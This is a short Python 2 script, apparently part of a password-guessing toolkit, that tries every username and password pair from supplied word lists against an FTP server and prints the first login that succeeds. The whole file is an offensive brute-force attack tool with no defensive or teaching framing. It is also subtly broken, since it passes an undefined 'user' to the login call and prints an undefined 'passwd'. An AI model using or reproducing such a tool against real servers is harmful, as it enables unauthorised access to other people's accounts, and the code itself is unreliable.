#!/usr/bin/env python
# -*- coding: utf-8 -*-
from ftplib import FTP

def explode(host,port,dic):
    ftp = FTP()
    try:
        ftp.connect(host,port,timeout=10)
    except:
        return
    for username in dic['username']:
        for password in dic['password']:
            try:
                ftp.login(user,password)
                print '\33[33m'+host+':ftp\t'+'username:'+username+'\tpassword:'+passwd+'\33[37m'
                return
            except:
                continue
